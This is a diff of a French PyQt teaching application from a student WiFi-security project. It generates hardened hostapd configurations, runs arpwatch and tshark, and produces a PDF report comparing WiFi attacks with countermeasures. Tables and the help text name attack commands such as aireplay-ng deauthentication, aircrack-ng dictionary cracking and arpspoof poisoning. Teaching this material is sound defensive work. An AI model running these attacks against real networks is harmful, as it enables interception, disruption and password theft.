+        ws_desc.setWordWrap(True)
+        ws_desc.setStyleSheet("color:#888; font-size:11px;")
+        ws_lay.addWidget(ws_desc)
+        ws_cfg = QGroupBox("Capture tshark")
+        ws_form = QFormLayout(ws_cfg)
+        self.ws_iface  = QLineEdit("wlan0")
+        self.ws_filter = QLineEdit("not arp and not icmp")
+        self.ws_count  = QSpinBox()
+        self.ws_count.setRange(10, 500); self.ws_count.setValue(50)
+        ws_form.addRow("Interface :", self.ws_iface)
+        ws_form.addRow("Filtre BPF :", self.ws_filter)
+        ws_form.addRow("Nb paquets :", self.ws_count)
+        ws_lay.addWidget(ws_cfg)
+        self.ws_terminal = QTextEdit(); self.ws_terminal.setReadOnly(True)
+        ws_lay.addWidget(self.ws_terminal, stretch=1)
+        self.stack.addWidget(ws_w)
+
+        lay.addWidget(self.stack, stretch=1)
+
+    def show_page(self, idx):
+        self.stack.setCurrentIndex(idx)
+
+    def _run_on_current(self, cmd):
+        idx = self.stack.currentIndex()
+        terms = [self.ap_terminal, self.aw_terminal, self.ws_terminal]
+        terminal = terms[idx]
+        terminal.clear()
+        self.thread = CmdThread(cmd)
+        self.thread.output.connect(terminal.append)
+        self.thread.start()
+
+    def stop_defense(self):
+        if self.thread: self.thread.stop()
+
+    def lancer(self):
+        idx = self.stack.currentIndex()
+        if idx == 0:   self.gen_and_start_ap()
+        elif idx == 1: self.start_arpwatch()
+        elif idx == 2: self.start_tshark()
+
+    def gen_hostapd(self):
+        mode = self.ap_mode.currentIndex()
+        mfp  = "2" if self.ap_mfp.isChecked() else "0"
+        if mode == 0:
+            sec = f"wpa=2\nwpa_passphrase={self.ap_pass.text()}\nwpa_key_mgmt=WPA-PSK\nrsn_pairwise=CCMP"
+        elif mode == 1:
+            sec = f"wpa=2\nwpa_passphrase={self.ap_pass.text()}\nwpa_key_mgmt=SAE\nrsn_pairwise=CCMP\nsae_require_mfp=1"
+        else:
+            sec = f"wpa=2\nwpa_passphrase={self.ap_pass.text()}\nwpa_key_mgmt=WPA-PSK SAE\nrsn_pairwise=CCMP"
+        conf = (f"interface={self.ap_iface.text()}\ndriver=nl80211\nhw_mode=g\n"
+                f"channel={self.ap_chan.text()}\nssid={self.ap_ssid.text()}\n"
+                f"wmm_enabled=1\nmacaddr_acl=0\nauth_algs=1\nignore_broadcast_ssid=0\n"
+                f"{sec}\nieee80211w={mfp}\n")
+        conf_path = "/tmp/hostapd_secure.conf"
+        with open(conf_path, "w") as f: f.write(conf)
+        self.ap_terminal.append(
+            f"<span style='color:{COLORS['success']};'>hostapd.conf → {conf_path}</span><br>"
+            f"<pre style='color:{COLORS['text']}; font-size:11px;'>{conf}</pre>"
+        )
+        return conf_path
+
+    def gen_and_start_ap(self):
+        try:
+            conf = self.gen_hostapd()
+        except Exception as e:
+            self.ap_terminal.append(f"<span style='color:{COLORS['danger']};'>Erreur : {e}</span>")
+            return
+        self._run_on_current(f"sudo hostapd {conf}")
+
+    def start_arpwatch(self):
+        iface = self.aw_iface.text().strip()
+        self.aw_terminal.append(
+            f"<span style='color:{COLORS['success']};'>Surveillance ARP sur {iface}...</span><br>"
+        )
+        self._run_on_current(f"sudo arpwatch -i {iface} -l /tmp/arpwatch.log")
+
+    def start_tshark(self):
+        iface = self.ws_iface.text().strip()
+        filt  = self.ws_filter.text().strip()
+        count = self.ws_count.value()
+        cap   = f"/tmp/capture_{datetime.now():%H%M%S}.pcap"
+        cmd   = f"sudo tshark -i {iface} -c {count} -w {cap}"
+        if filt: cmd += f" -f '{filt}'"
+        self.ws_terminal.append(
+            f"<span style='color:{COLORS['success']};'>Capture → {cap}</span><br>"
+        )
+        self._run_on_current(cmd)
+
+
+# ==================== ONGLET BILAN ====================
+class TabBilan(QWidget):
+    def __init__(self):
+        super().__init__()
+        self.results = []
+        self._build()
+
+    def _build(self):
+        lay = QVBoxLayout(self)
+        lay.setContentsMargins(10, 10, 10, 10)
+
+        hdr = QLabel("BILAN – ATTAQUES VS CONTRE-MESURES")
+        hdr.setStyleSheet(f"font-size:16px; font-weight:bold; color:{COLORS['accent']};")
+        lay.addWidget(hdr)
+
+        desc = QLabel(
+            "Tableau comparatif des attaques démontées et des défenses appliquées.\n"
+            "Ce bilan sera inclus dans le rapport PDF final."
+        )
+        desc.setStyleSheet("color:#888; font-size:11px;")
+        desc.setWordWrap(True)
+        lay.addWidget(desc)
+
+        # Tableau bilan
+        self.table = QTableWidget(6, 5)
+        self.table.setHorizontalHeaderLabels([
+            "Attaque", "Outil attaque", "Résultat", "Contre-mesure", "Outil défense"
+        ])
+        self.table.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)
+        self.table.setWordWrap(True)
+        self.table.verticalHeader().setVisible(False)
+        self.table.setEditTriggers(QTableWidget.NoEditTriggers)
+
+        bilan = [
+            ("Réseau ouvert / WEP", "airodump-ng\naircrack-ng",
+             "Clé cassée en < 2 min", "Migrer vers WPA2/WPA3", "hostapd + WPA3"),
+            ("Attaque Deauth\n(déconnexion forcée)", "aireplay-ng --deauth",
+             "Clients déconnectés", "Activer 802.11w (MFP)", "hostapd ieee80211w=2"),
+            ("WPA Handshake + Crack", "airodump-ng\naircrack-ng",
+             "Mot de passe faible cassé", "Mot de passe 20+ chars", "Wordlist non pertinente"),
+            ("ARP Poisoning (MiM)", "arpspoof\nettercap",
+             "Trafic intercepté", "arpwatch + détection", "arpwatch -i wlan0"),
+            ("Rogue AP / Evil Twin", "hostapd-wpe",
+             "Clients trompés", "Certificat 802.1X + WIPS", "FreeRADIUS + WPA-Enterprise"),
+            ("War Driving\n(cartographie)", "airodump-ng\nKismet",
+             "Réseaux détectés", "SSID masqué + WPA3", "hostapd ignore_broadcast"),
+        ]
+
+        colors_result = [COLORS['danger'], COLORS['danger'], COLORS['danger'],
+                         COLORS['danger'], COLORS['warning'], COLORS['warning']]
+        colors_defense = [COLORS['success']] * 6
+
+        for i, (att, tool_a, result, defense, tool_d) in enumerate(bilan):
+            self.table.setItem(i, 0, QTableWidgetItem(att))
+            self.table.setItem(i, 1, QTableWidgetItem(tool_a))
+
+            ri = QTableWidgetItem(result)
+            ri.setBackground(QColor(colors_result[i]))
+            ri.setForeground(QBrush(QColor("white")))
+            self.table.setItem(i, 2, ri)
+
+            di = QTableWidgetItem(defense)
+            di.setBackground(QColor(colors_defense[i]))
+            di.setForeground(QBrush(QColor("white")))
+            self.table.setItem(i, 3, di)
+
+            self.table.setItem(i, 4, QTableWidgetItem(tool_d))
+
+        self.table.resizeRowsToContents()
+        lay.addWidget(self.table)
+
+        self.pdf_status = QLabel("")
+        self.pdf_status.setAlignment(Qt.AlignCenter)
+        self.pdf_status.setStyleSheet(f"color:{COLORS['success']}; font-weight:bold;")
+        lay.addWidget(self.pdf_status)
+
+    def gen_pdf(self):
+        self.pdf_status.setText("Génération du PDF en cours...")
+        try:
+            path = generate_pdf_wifi()
+            self.pdf_status.setText(f"✅ PDF généré : {path}")
+            subprocess.Popen(["xdg-open", path])
+        except Exception as e:
+            self.pdf_status.setText(f"Erreur PDF : {e}")
+
+
+# ==================== GÉNÉRATION PDF ====================
+def generate_pdf_wifi():
+    from reportlab.lib.pagesizes import A4
+    from reportlab.lib import colors as C
+    from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
+    from reportlab.lib.units import cm
+    from reportlab.platypus import (SimpleDocTemplate, Paragraph, Spacer,
+                                    Table, TableStyle, HRFlowable, PageBreak)
+    from reportlab.lib.enums import TA_LEFT, TA_CENTER
+
+    pdf_dir = os.path.expanduser("~/CyberSec_Rapports")
+    os.makedirs(pdf_dir, exist_ok=True)
+    path = os.path.join(pdf_dir, f"wifi_securite_{datetime.now():%Y%m%d_%H%M%S}.pdf")
+
+    doc = SimpleDocTemplate(path, pagesize=A4,
+                            leftMargin=1.8*cm, rightMargin=1.8*cm,
+                            topMargin=2*cm, bottomMargin=2*cm)
+    st   = getSampleStyleSheet()
+    PW   = A4[0] - 3.6*cm
+
+    def S(name, **kw): return ParagraphStyle(name, parent=st['Normal'], **kw)
+
+    small  = S('sm',  fontSize=8,  leading=11)
+    normal = S('nm',  fontSize=9,  leading=13)
+    h1     = S('h1p', fontSize=13, leading=16, fontName='Helvetica-Bold',
+               textColor=C.HexColor("#1a56db"), spaceBefore=14, spaceAfter=6)
+    h2_org = S('h2o', fontSize=11, leading=14, fontName='Helvetica-Bold',
+               textColor=C.HexColor("#c05621"), spaceBefore=10, spaceAfter=5)
+    title  = S('tit', fontSize=18, leading=22, fontName='Helvetica-Bold',
+               textColor=C.HexColor("#1e3a5f"))
+    hdr    = S('hdr', fontSize=8,  leading=10, fontName='Helvetica-Bold',
+               textColor=C.white, alignment=TA_CENTER)
+    green  = S('grn', fontSize=8,  leading=10, fontName='Helvetica-Bold',
+               textColor=C.white, alignment=TA_CENTER,
+               backColor=C.HexColor("#166534"))
+    red    = S('red', fontSize=8,  leading=10, fontName='Helvetica-Bold',
+               textColor=C.white, alignment=TA_CENTER,
+               backColor=C.HexColor("#7f1d1d"))
+
+    def tbl_style(header_col=C.HexColor("#1e3a5f")):
+        return TableStyle([
+            ('BACKGROUND',     (0,0), (-1,0), header_col),
+            ('ROWBACKGROUNDS', (0,1), (-1,-1), [C.white, C.HexColor("#f0f4f8")]),
+            ('GRID',           (0,0), (-1,-1), 0.5, C.grey),
+            ('PADDING',        (0,0), (-1,-1), 7),
+            ('VALIGN',         (0,0), (-1,-1), 'TOP'),
+        ])
+
+    story = []
+
+    # ── Page de garde ──
+    story += [
+        Paragraph("RAPPORT – SECURITE RESEAU WIFI", title),
+        Paragraph("Groupe 7 | Sujet 3 – Menaces et contre-mesures WiFi | CyberSec 2026", small),
+        HRFlowable(width="100%", thickness=2, color=C.HexColor("#1a56db")),
+        Spacer(1, 0.4*cm),
+    ]
+
+    meta = [
+        [Paragraph("Sujet", hdr),    Paragraph("Securite d'un reseau WiFi", small)],
+        [Paragraph("Groupe", hdr),   Paragraph("Groupe 7", small)],
+        [Paragraph("Outils", hdr),   Paragraph("aircrack-ng, aireplay-ng, hostapd, arpwatch, tshark, Wireshark", small)],
+        [Paragraph("Date", hdr),     Paragraph(datetime.now().strftime("%d/%m/%Y a %H:%M"), small)],
+        [Paragraph("Objectif", hdr), Paragraph("Demonstrer les attaques WiFi et valider les contre-mesures", small)],
+    ]
+    mt = Table(meta, colWidths=[3*cm, PW-3*cm])
+    mt.setStyle(TableStyle([
+        ('BACKGROUND',    (0,0), (0,-1), C.HexColor("#1e3a5f")),
+        ('TEXTCOLOR',     (0,0), (0,-1), C.white),
+        ('ROWBACKGROUNDS',(1,0), (1,-1), [C.white, C.HexColor("#f0f4f8")]),
+        ('GRID',          (0,0), (-1,-1), 0.5, C.grey),
+        ('VALIGN',        (0,0), (-1,-1), 'TOP'),
+        ('PADDING',       (0,0), (-1,-1), 6),
+    ]))
+    story += [mt, Spacer(1, 0.5*cm)]
+
+    # ── Section 1 : Architecture ──
+    story.append(Paragraph("1. ARCHITECTURE DE LA DEMONSTRATION", h1))
+    arch_data = [
+        [Paragraph("Composant", hdr), Paragraph("Role", hdr), Paragraph("Outil", hdr)],
+        [Paragraph("PC Kali Linux", small), Paragraph("Attaquant + Defenseur", small), Paragraph("Kali Linux 2024", small)],
+        [Paragraph("Interface wlan0mon", small), Paragraph("Ecoute passive (mode moniteur)", small), Paragraph("airmon-ng", small)],
+        [Paragraph("AP WiFi test", small), Paragraph("Cible des attaques", small), Paragraph("hostapd", small)],
+        [Paragraph("Client WiFi (telephone)", small), Paragraph("Victime des attaques", small), Paragraph("Appareil mobile", small)],
+        [Paragraph("USB tethering", small), Paragraph("Connexion internet Kali", small), Paragraph("usb0", small)],
+    ]
+    t = Table(arch_data, colWidths=[PW*0.3, PW*0.4, PW*0.3])
+    t.setStyle(tbl_style())
+    story += [t, Spacer(1, 0.4*cm)]
+
+    # ── Section 2 : Attaques ──
+    story.append(Paragraph("2. ATTAQUES DEMONSTREES", h1))
+
+    attaques = [
+        ("Reseau ouvert / WEP", "Chiffrement absent ou casse en < 2 minutes",
+         "airodump-ng + aircrack-ng", "CRITIQUE"),
+        ("Deauth (802.11)", "Deconnexion forcee de tous les clients du reseau",
+         "aireplay-ng --deauth", "ELEVE"),
+        ("WPA Handshake Crack", "Capture du 4-way handshake puis crack offline avec dictionnaire",
+         "airodump-ng + aircrack-ng + rockyou.txt", "ELEVE"),
+        ("ARP Poisoning (MiM)", "Interception de tout le trafic entre client et routeur",
+         "arpspoof", "ELEVE"),
+        ("War Driving", "Cartographie des reseaux WiFi accessibles dans la zone",
+         "airodump-ng + Kismet", "MOYEN"),
+    ]
+
+    att_data = [[Paragraph("Attaque", hdr), Paragraph("Description", hdr),
+                 Paragraph("Outil", hdr), Paragraph("Niveau", hdr)]]
+    risk_colors = {
+        "CRITIQUE": C.HexColor("#7f1d1d"),
+        "ELEVE":    C.HexColor("#c0392b"),
+        "MOYEN":    C.HexColor("#d97706"),
+    }
+    att_style_cmds = list(tbl_style().getCommands())
+
+    for i, (att, desc, tool, niveau) in enumerate(attaques, 1):
+        rc = risk_colors.get(niveau, C.grey)
+        ns = S(f'ns{i}', fontSize=8, leading=10, fontName='Helvetica-Bold',
+               textColor=C.white, alignment=TA_CENTER)
+        att_data.append([Paragraph(att, small), Paragraph(desc, small),
+                         Paragraph(tool, small), Paragraph(niveau, ns)])
+        att_style_cmds.append(('BACKGROUND', (3, i), (3, i), rc))
+
+    att_tbl = Table(att_data, colWidths=[PW*0.22, PW*0.38, PW*0.25, PW*0.15])
+    att_tbl.setStyle(TableStyle(att_style_cmds))
+    story += [att_tbl, Spacer(1, 0.4*cm)]
+
+    # ── Section 3 : Contre-mesures ──
+    story.append(Paragraph("3. CONTRE-MESURES APPLIQUEES", h1))
+
+    defenses = [
+        ("Reseau ouvert / WEP", "Migration vers WPA3 (SAE)",
+         "hostapd avec wpa_key_mgmt=SAE", "Crack impossible sans cle PSK forte"),
+        ("Deauth attack", "Activation 802.11w (MFP)",
+         "hostapd avec ieee80211w=2", "Trames deauth ignorees par le client"),
+        ("WPA Crack", "Mot de passe 20+ caracteres complexes",
+         "Politique de mot de passe forte", "Dictionnaire inefficace (temps > 1000 ans)"),
+        ("ARP Poisoning", "Surveillance arpwatch + ARP statique",
+         "arpwatch -i wlan0", "Alerte immediate sur changement MAC/IP"),
+        ("War Driving", "SSID masque + filtrage MAC",
+         "ignore_broadcast_ssid=1 dans hostapd", "Reseau invisible aux scanners passifs"),
+    ]
+
+    def_data = [[Paragraph("Attaque ciblee", hdr), Paragraph("Contre-mesure", hdr),
+                 Paragraph("Outil / Configuration", hdr), Paragraph("Effet", hdr)]]
+    for att, cm_txt, tool, effet in defenses:
+        def_data.append([Paragraph(att, small), Paragraph(cm_txt, small),
+                         Paragraph(tool, small), Paragraph(effet, small)])
+
+    def_tbl = Table(def_data, colWidths=[PW*0.2, PW*0.25, PW*0.3, PW*0.25])
+    def_tbl.setStyle(tbl_style(C.HexColor("#166534")))
+    story += [def_tbl, Spacer(1, 0.4*cm)]
+
+    story.append(PageBreak())
+
+    # ── Section 4 : Protocoles de sécurité ──
+    story.append(Paragraph("4. COMPARAISON DES PROTOCOLES WIFI", h1))
+
+    proto_data = [
+        [Paragraph(t, hdr) for t in ["Protocole", "Annee", "Chiffrement", "Niveau securite", "Vulnerabilites"]],
+        [Paragraph("WEP",  small), Paragraph("1997", small), Paragraph("RC4 (40/128 bits)", small),
+         Paragraph("Tres faible", red), Paragraph("Casse en < 2 min (FMS, KoreK)", small)],
+        [Paragraph("WPA",  small), Paragraph("2003", small), Paragraph("TKIP/RC4", small),
+         Paragraph("Faible",      S('fw', fontSize=8, leading=10, fontName='Helvetica-Bold',
+                                    textColor=C.white, alignment=TA_CENTER,
+                                    backColor=C.HexColor("#d97706"))),
+         Paragraph("TKIP vulnerable, attaques dict.", small)],
+        [Paragraph("WPA2", small), Paragraph("2004", small), Paragraph("AES-CCMP (128 bits)", small),
+         Paragraph("Modere",      S('md', fontSize=8, leading=10, fontName='Helvetica-Bold',
+                                    textColor=C.white, alignment=TA_CENTER,
+                                    backColor=C.HexColor("#d97706"))),
+         Paragraph("KRACK, crack si MDP faible", small)],
+        [Paragraph("WPA3", small), Paragraph("2018", small), Paragraph("AES-CCMP/GCMP (256 bits)", small),
+         Paragraph("Eleve", green), Paragraph("Deploiement complexe, peu d'appareils", small)],
+    ]
+    proto_tbl = Table(proto_data, colWidths=[PW*0.12, PW*0.1, PW*0.22, PW*0.15, PW*0.41])
+    proto_tbl.setStyle(tbl_style())
+    story += [proto_tbl, Spacer(1, 0.4*cm)]
+
+    # ── Section 5 : Bilan ──
+    story.append(Paragraph("5. BILAN ET CONCLUSION", h1))
+    conclusion = [
+        Paragraph("La demonstration a montre que les reseaux WiFi non securises sont extremement vulnerables.", normal),
+        Spacer(1, 0.2*cm),
+        Paragraph("Points cles :", S('pk', fontSize=9, leading=13, fontName='Helvetica-Bold')),
+        Paragraph("• WEP est obsolete et ne doit plus jamais etre utilise.", normal),
+        Paragraph("• WPA2 est acceptable avec un mot de passe long et complexe (20+ caracteres).", normal),
+        Paragraph("• WPA3 avec 802.11w est la solution recommandee pour 2024.", normal),
+        Paragraph("• Les attaques Deauth sont bloquees par ieee80211w=2 (MFP obligatoire).", normal),
+        Paragraph("• arpwatch detecte efficacement les attaques ARP Poisoning en temps reel.", normal),
+        Paragraph("• La sensibilisation des utilisateurs reste la premiere ligne de defense.", normal),
+    ]
+    story.extend(conclusion)
+
+    doc.build(story)
+    return path
+
+
+# ==================== FENÊTRE PRINCIPALE ====================
+class MainWindow(QMainWindow):
+    def __init__(self):
+        super().__init__()
+        self.setWindowTitle("Securite Reseau WiFi – Groupe 7 (Sujet 3)")
+        self.resize(1280, 860)
+        self.setMinimumSize(1000, 650)
+        self._build()
+
+    def _build(self):
+        self.setStyleSheet(stylesheet())
+        central = QWidget()
+        self.setCentralWidget(central)
+        lay = QVBoxLayout(central)
+        lay.setContentsMargins(14, 14, 14, 0)
+        lay.setSpacing(6)
+
+        # ── Titre ──
+        title_row = QHBoxLayout()
+        title = QLabel("SECURITE RESEAU WIFI – ATTAQUES & CONTRE-MESURES")
+        title.setStyleSheet(f"font-size:20px; font-weight:bold; color:{COLORS['accent']};")
+        title_row.addWidget(title, stretch=1)
+        btn_help = QPushButton("i")
+        btn_help.setFixedSize(34, 34)
+        btn_help.setStyleSheet(f"""
+            QPushButton {{
+                background:#1e3a5f; color:{COLORS['accent']};
+                border:2px solid {COLORS['accent']}; border-radius:17px;
+                font-size:14px; font-weight:bold;
+            }}
+            QPushButton:hover {{ background:{COLORS['accent']}; color:white; }}
+        """)
+        btn_help.clicked.connect(self.open_help)
+        title_row.addWidget(btn_help)
+        lay.addLayout(title_row)
+
+        sub = QLabel("Groupe 7 | Sujet 3 – Sécurité d'un réseau WiFi | Outils : aircrack-ng, hostapd, arpwatch, tshark")
+        sub.setStyleSheet("color:#888; font-size:11px;")
+        lay.addWidget(sub)
+
+        # ── QStackedWidget — pages principales ──
+        self.stack = QStackedWidget()
+
+        self.tab_scanner  = TabScanner()
+        self.tab_attaques = TabAttaques()
+        self.tab_defenses = TabDefenses()
+        self.tab_bilan    = TabBilan()
+
+        self.stack.addWidget(self.tab_scanner)   # 0
+        self.stack.addWidget(self.tab_attaques)  # 1
+        self.stack.addWidget(self.tab_defenses)  # 2
+        self.stack.addWidget(self.tab_bilan)     # 3
+
+        lay.addWidget(self.stack, stretch=1)
+
+        # ── Connecter signal scanner → attaques ──
+        self.tab_scanner.networks_updated.connect(self.tab_attaques.update_networks)
+
+        # ── Barre de boutons EN BAS ──
+        bottom = QFrame()
+        bottom.setFixedHeight(54)
+        bottom.setStyleSheet(
+            f"background:{COLORS['input']}; border-top:1px solid {COLORS['border']};"
+        )
+        bot_lay = QHBoxLayout(bottom)
+        bot_lay.setContentsMargins(14, 6, 14, 6)
+        bot_lay.setSpacing(8)
+
+        # ── GAUCHE : Dropdown navigation principal (4 pages) ──
+        self.nav_combo = QComboBox()
+        self.nav_combo.addItems([
+            "Scanner WiFi",
+            "Attaques",
+            "Défenses",
+            "Bilan & PDF",
+        ])
+        self.nav_combo.setFixedWidth(160)
+        self.nav_combo.currentIndexChanged.connect(self._on_nav)
+        bot_lay.addWidget(self.nav_combo)
+
+        self.btn_lancer = QPushButton("Scanner")
+        self.btn_lancer.setFixedHeight(36)
+        self.btn_lancer.setStyleSheet("background:#166534; font-weight:bold; min-width:80px;")
+        self.btn_lancer.clicked.connect(self._lancer)
+        bot_lay.addWidget(self.btn_lancer)
+
+        self.btn_arreter = QPushButton("Arrêter")
+        self.btn_arreter.setFixedHeight(36)
+        self.btn_arreter.setStyleSheet("background:#7f1d1d; font-weight:bold; min-width:80px;")
+        self.btn_arreter.clicked.connect(self._arreter)
+        bot_lay.addWidget(self.btn_arreter)
+
+        # ── MILIEU : stretch ──
+        bot_lay.addStretch()
+
+        # ── DROITE : Boutons contextuels Scanner ──
+        self.btn_nmcli    = self._bot_btn("Scanner (nmcli)", "#166534")
+        self.btn_monitor  = self._bot_btn("Mode moniteur",   "#c05621")
+        self.btn_airodump = self._bot_btn("Airodump-ng",     COLORS['accent'])
+        self.btn_restore  = self._bot_btn("Restaurer réseau","#1e3a5f")
+        self.btn_nmcli.clicked.connect(self.tab_scanner.scan_nmcli)
+        self.btn_monitor.clicked.connect(self.tab_scanner.enable_monitor)
+        self.btn_airodump.clicked.connect(self.tab_scanner.scan_airodump)
+        self.btn_restore.clicked.connect(self.tab_scanner.restore_nm)
+        self._scanner_btns = [self.btn_nmcli, self.btn_monitor,
+                               self.btn_airodump, self.btn_restore]
+        for b in self._scanner_btns:
+            bot_lay.addWidget(b)
+
+        # ── DROITE : Dropdown sous-page Attaques ──
+        self.att_sub_combo = QComboBox()
+        self.att_sub_combo.addItems([
+            "Deauth (802.11)",
+            "ARP Poisoning (MiM)",
+            "WPA Handshake + Crack",
+            "Attaque Dictionnaire",
+        ])
+        self.att_sub_combo.setFixedWidth(210)
+        self.att_sub_combo.setStyleSheet(f"""
+            QComboBox {{
+                background: {COLORS['danger']};
+                color: white;
+                border: 1px solid {COLORS['danger']};
+                border-radius: 4px;
+                padding: 4px 10px 4px 10px;
+                font-size: 11px;
+                font-weight: bold;
+            }}
+            QComboBox::drop-down {{
+                subcontrol-origin: padding;
+                subcontrol-position: right center;
+                width: 24px;
+                border-left: 1px solid rgba(255,255,255,0.3);
+                background: rgba(0,0,0,0.2);
+                border-radius: 0 4px 4px 0;
+            }}
+            QComboBox::down-arrow {{
+                image: none;
+                width: 0; height: 0;
+                border-left: 5px solid transparent;
+                border-right: 5px solid transparent;
+                border-top: 6px solid white;
+            }}
+            QComboBox QAbstractItemView {{
+                background: {COLORS['input']};
+                color: {COLORS['text']};
+                border: 1px solid {COLORS['border']};
+                selection-background-color: {COLORS['danger']};
+            }}
+        """)
+        self.att_sub_combo.currentIndexChanged.connect(self._att_page)
+        bot_lay.addWidget(self.att_sub_combo)
+
+        # ── DROITE : Dropdown sous-page Défenses ──
+        self.def_sub_combo = QComboBox()
+        self.def_sub_combo.addItems([
+            "AP WPA2/WPA3 + 802.11w",
+            "arpwatch (Anti-MiM)",
+            "Analyse trafic (tshark)",
+        ])
+        self.def_sub_combo.setFixedWidth(220)
+        self.def_sub_combo.setStyleSheet(f"""
+            QComboBox {{
+                background: {COLORS['success']};
+                color: white;
+                border: 1px solid {COLORS['success']};
+                border-radius: 4px;
+                padding: 4px 10px 4px 10px;
+                font-size: 11px;
+                font-weight: bold;
+            }}
+            QComboBox::drop-down {{
+                subcontrol-origin: padding;
+                subcontrol-position: right center;
+                width: 24px;
+                border-left: 1px solid rgba(255,255,255,0.3);
+                background: rgba(0,0,0,0.2);
+                border-radius: 0 4px 4px 0;
+            }}
+            QComboBox::down-arrow {{
+                image: none;
+                width: 0; height: 0;
+                border-left: 5px solid transparent;
+                border-right: 5px solid transparent;
+                border-top: 6px solid white;
+            }}
+            QComboBox QAbstractItemView {{
+                background: {COLORS['input']};
+                color: {COLORS['text']};
+                border: 1px solid {COLORS['border']};
+                selection-background-color: {COLORS['success']};
+            }}
+        """)
+        self.def_sub_combo.currentIndexChanged.connect(self._def_page)
+        bot_lay.addWidget(self.def_sub_combo)
+
+        # ── DROITE : Bouton Generer hostapd.conf (Défenses seulement) ──
+        self.btn_gen_conf = self._bot_btn("hostapd.conf", "#1e3a5f")
+        self.btn_gen_conf.clicked.connect(lambda: self.tab_defenses.gen_hostapd())
+        bot_lay.addWidget(self.btn_gen_conf)
+
+        # ── DROITE : Bouton PDF (Bilan seulement) ──
+        self.btn_pdf = self._bot_btn("Générer PDF", COLORS['accent'])
+        self.btn_pdf.clicked.connect(self.tab_bilan.gen_pdf)
+        bot_lay.addWidget(self.btn_pdf)
+
+        lay.addWidget(bottom)
+
+        # Listes pour visibilité contextuelle
+        self._scanner_btns_all = self._scanner_btns
+        self._update_bottom_btns(0)
+
+    def _bot_btn(self, label, color, checkable=False):
+        b = QPushButton(label)
+        b.setFixedHeight(34)
+        b.setCheckable(checkable)
+        b.setStyleSheet(f"""
+            QPushButton {{
+                background: transparent;
+                border: 1px solid {color};
+                color: {color};
+                border-radius: 4px;
+                padding: 2px 10px;
+                font-size: 11px;
+            }}
+            QPushButton:hover {{ background: {color}; color: white; }}
+            QPushButton:checked {{ background: {color}; color: white; font-weight: bold; }}
+        """)
+        return b
+
+    def _on_nav(self, idx):
+        self.stack.setCurrentIndex(idx)
+        self._update_bottom_btns(idx)
+        labels = ["Scanner", "Lancer", "Lancer", "Générer PDF"]
+        self.btn_lancer.setText(labels[idx])
+
+    def _update_bottom_btns(self, idx):
+        # Cacher tout
+        for b in self._scanner_btns:
+            b.setVisible(False)
+        self.att_sub_combo.setVisible(False)
+        self.def_sub_combo.setVisible(False)
+        self.btn_gen_conf.setVisible(False)
+        self.btn_pdf.setVisible(False)
+
+        if idx == 0:   # Scanner
+            for b in self._scanner_btns: b.setVisible(True)
+        elif idx == 1: # Attaques
+            self.att_sub_combo.setVisible(True)
+        elif idx == 2: # Défenses
+            self.def_sub_combo.setVisible(True)
+            self.btn_gen_conf.setVisible(True)
+        elif idx == 3: # Bilan
+            self.btn_pdf.setVisible(True)
+
+    def _att_page(self, idx):
+        self.tab_attaques.show_page(idx)
+
+    def _def_page(self, idx):
+        self.tab_defenses.show_page(idx)
+
+    def _lancer(self):
+        idx = self.stack.currentIndex()
+        if idx == 0:   self.tab_scanner.scan_nmcli()
+        elif idx == 1: self.tab_attaques.lancer()
+        elif idx == 2: self.tab_defenses.lancer()
+        elif idx == 3: self.tab_bilan.gen_pdf()
+
+    def _arreter(self):
+        idx = self.stack.currentIndex()
+        if idx == 0:   self.tab_scanner.stop_scan()
+        elif idx == 1: self.tab_attaques.stop_attack()
+        elif idx == 2: self.tab_defenses.stop_defense()
+
+    def open_help(self):
+        dlg = QDialog(self,
+                      Qt.Window | Qt.WindowTitleHint | Qt.WindowSystemMenuHint |
+                      Qt.WindowMinimizeButtonHint | Qt.WindowMaximizeButtonHint |
+                      Qt.WindowCloseButtonHint)
+        dlg.setWindowTitle("Aide – Sécurité réseau WiFi")
+        dlg.resize(780, 660)
+        dlg.setStyleSheet(stylesheet())
+        lay = QVBoxLayout(dlg)
+        lay.setContentsMargins(16, 16, 16, 16)
+
+        title = QLabel("GUIDE – SÉCURITÉ RÉSEAU WIFI")
+        title.setStyleSheet(f"font-size:15px; font-weight:bold; color:{COLORS['accent']};")
+        lay.addWidget(title)
+
+        content = QTextEdit()
+        content.setReadOnly(True)
+        content.setStyleSheet(
+            f"background:#0d1117; color:{COLORS['text']}; font-family:'Segoe UI';"
+            f"font-size:12px; border:1px solid {COLORS['border']}; border-radius:6px; padding:12px;"
+        )
+        content.setHtml(f"""
+<style>
+  h2 {{ color:{COLORS['accent']}; font-size:13px; margin-top:12px; }}
+  h3 {{ color:{COLORS['orange']}; font-size:11px; margin-top:8px; }}
+  table {{ border-collapse:collapse; width:100%; margin:6px 0; }}
+  td,th {{ border:1px solid #30363d; padding:4px 8px; font-size:11px; }}
+  th {{ background:#1e3a5f; color:{COLORS['accent']}; }}
+  tr:nth-child(even) {{ background:#161b22; }}
+  .code {{ font-family:Consolas; background:#161b22; color:#3fb950;
+           padding:2px 6px; border-radius:3px; font-size:10px; }}
+  .danger {{ color:{COLORS['danger']}; font-weight:bold; }}
+  .ok {{ color:{COLORS['success']}; font-weight:bold; }}
+</style>
+
+<h2>But de l'application</h2>
+<p>Démontrer les attaques WiFi réelles et valider les contre-mesures
+pour répondre au Sujet 3 : <b>Sécurité d'un réseau WiFi</b>.</p>
+
+<h2>📡 Onglet Scanner WiFi</h2>
+<table>
+<tr><th>Étape</th><th>Commande</th><th>But</th></tr>
+<tr><td>1. Mode moniteur</td><td><span class="code">airmon-ng start wlan0</span></td><td>Écoute passive</td></tr>
+<tr><td>2. Scanner réseaux</td><td><span class="code">airodump-ng wlan0mon</span></td><td>Détecter SSID/BSSID/chiffrement</td></tr>
+</table>
+
+<h2>Onglet Attaques</h2>
+<table>
+<tr><th>Attaque</th><th>Commande</th><th>Effet</th></tr>
+<tr><td>Deauth</td><td><span class="code">aireplay-ng --deauth</span></td><td class="danger">Déconnexion forcée</td></tr>
+<tr><td>WPA Crack</td><td><span class="code">aircrack-ng -w rockyou.txt</span></td><td class="danger">Mot de passe cassé</td></tr>
+<tr><td>ARP Poisoning</td><td><span class="code">arpspoof -t victime routeur</span></td><td class="danger">Trafic intercepté</td></tr>
+</table>
+
+<h2>Onglet Défenses</h2>
+<table>
+<tr><th>Contre-mesure</th><th>Outil</th><th>Effet</th></tr>
